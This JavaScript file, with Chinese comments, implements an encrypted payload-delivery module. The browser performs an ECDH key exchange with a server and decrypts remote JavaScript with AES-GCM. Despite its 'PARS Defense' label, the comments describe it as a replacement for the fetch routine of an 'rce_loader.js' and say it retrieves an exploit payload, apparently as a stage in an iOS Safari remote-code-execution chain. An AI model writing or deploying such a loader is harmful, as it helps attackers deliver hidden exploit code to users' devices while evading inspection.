/**
 * PARS Defense - 加密投递模块（ECDH + AES-GCM）
 *
 * 使用 Web Crypto API 实现真实的 ECDH 密钥交换 + AES-256-GCM 解密。
 * 全部异步，依赖 SubtleCrypto（Safari 10+ / iOS 10+ 原生支持）。
 *
 * 协议流程：
 *   1. 客户端生成 P-256 ECDH 临时密钥对
 *   2. POST 客户端公钥（SPKI DER → Base64）到服务端
 *   3. 服务端返回 { a: encryptedPayload_b64, b: serverPublicKey_b64 }
 *   4. 客户端用 ECDH 派生 AES-256-GCM 密钥
 *   5. 解密 payload（前 12 字节 IV + 剩余密文 + 16 字节 tag）
 *
 * 来源：iOS_Exploit_Code_Snippets.md Snippet 8/9/10
 */

'use strict';

// ── Base64 ↔ Uint8Array ───────────────────────────────────────────────────────

function b64toUint8Array(base64) {
  const bin = atob(base64);
  const bytes = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
  return bytes;
}

function uint8ArrayToB64(buf) {
  const u8 = new Uint8Array(buf);
  let bin = '';
  for (let i = 0; i < u8.length; i++) bin += String.fromCharCode(u8[i]);
  return btoa(bin);
}

// ── ECDH 密钥对生成 ──────────────────────────────────────────────────────────

async function generateKeyPair() {
  return crypto.subtle.generateKey(
    { name: 'ECDH', namedCurve: 'P-256' },
    true,
    ['deriveKey', 'deriveBits']
  );
}

// ── 导出公钥为 PEM 格式 ─────────────────────────────────────────────────────

async function exportPublicKeyAsPem(publicKey) {
  const spki = await crypto.subtle.exportKey('spki', publicKey);
  const b64 = uint8ArrayToB64(spki);
  return `-----BEGIN PUBLIC KEY-----\n${b64}\n-----END PUBLIC KEY-----`;
}

// ── 导出公钥为裸 Base64（用于 JSON 传输）────────────────────────────────────

async function exportPublicKeyAsBase64(publicKey) {
  const spki = await crypto.subtle.exportKey('spki', publicKey);
  return uint8ArrayToB64(spki);
}

// ── 派生 AES-256-GCM 密钥 ───────────────────────────────────────────────────

async function deriveAesKey(privateKey, serverPublicKeyBytes) {
  const serverPub = await crypto.subtle.importKey(
    'spki',
    serverPublicKeyBytes,
    { name: 'ECDH', namedCurve: 'P-256' },
    false,
    []
  );
  return crypto.subtle.deriveKey(
    { name: 'ECDH', public: serverPub },
    privateKey,
    { name: 'AES-GCM', length: 256 },
    false,
    ['decrypt']
  );
}

// ── AES-GCM 解密（IV 12 bytes 前缀 + ciphertext + 16 bytes tag）─────────────

async function decryptData(encryptedData, aesKey) {
  const iv = encryptedData.slice(0, 12);
  const ciphertext = encryptedData.slice(12);
  return crypto.subtle.decrypt(
    { name: 'AES-GCM', iv },
    aesKey,
    ciphertext
  );
}

// ── 主函数：加密 XHR 拉取 exploit payload ────────────────────────────────────

/**
 * 替代 rce_loader.js 中的 getJS()，通过 ECDH+AES 加密通道拉取远程 payload。
 * 同步阻塞版本（XMLHttpRequest sync + 内部 await 通过 message loop hack）。
 * 注意：在现代 Safari WebContent 进程中 sync XHR + async crypto 无法直接组合，
 * 因此本函数返回 Promise，调用方需 await 或 .then()。
 *
 * @param {string} fname - 文件路径
 * @param {string} serverUrl - 服务器 URL（默认 location.origin）
 * @returns {Promise<string|null>} 解密后的 JS 代码
 */
async function getJSEncrypted(fname, serverUrl) {
  serverUrl = serverUrl || (typeof localHost !== 'undefined' ? localHost : location.origin);
  try {
    const keyPair = await generateKeyPair();
    const pubB64 = await exportPublicKeyAsBase64(keyPair.publicKey);

    fname = fname.startsWith('/') ? fname : '/' + fname;

    // 同步 XHR POST 客户端公钥
    const xhr = new XMLHttpRequest();
    xhr.open('POST', serverUrl + fname + '?' + Date.now(), false);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify({ a: pubB64 }));

    if (xhr.status !== 200) {
      if (typeof print === 'function') print('[PARS Fetch] Server returned ' + xhr.status);
      return null;
    }

    const resp = JSON.parse(xhr.responseText);
    const encBytes = b64toUint8Array(resp.a);
    const serverPubBytes = b64toUint8Array(resp.b);

    const aesKey = await deriveAesKey(keyPair.privateKey, serverPubBytes);
    const plainBuf = await decryptData(encBytes, aesKey);
    const code = new TextDecoder().decode(plainBuf);

    if (typeof print === 'function') print('[PARS Fetch] Decrypted ' + code.length + ' bytes');
    return code;
  } catch (e) {
    if (typeof print === 'function') print('[PARS Fetch] Error: ' + e.message);
    return null;
  }
}

// ── 导出 ─────────────────────────────────────────────────────────────────────

if (typeof window !== 'undefined') {
  window.getJSEncrypted = getJSEncrypted;
  window.generateKeyPair = generateKeyPair;
  window.exportPublicKeyAsPem = exportPublicKeyAsPem;
  window.exportPublicKeyAsBase64 = exportPublicKeyAsBase64;
  window.b64toUint8Array = b64toUint8Array;
  window.deriveAesKey = deriveAesKey;
  window.decryptData = decryptData;
}

if (typeof print === 'function') {
  print('[PARS Defense] Encrypted fetch module loaded (SubtleCrypto ECDH+AES-GCM)');
}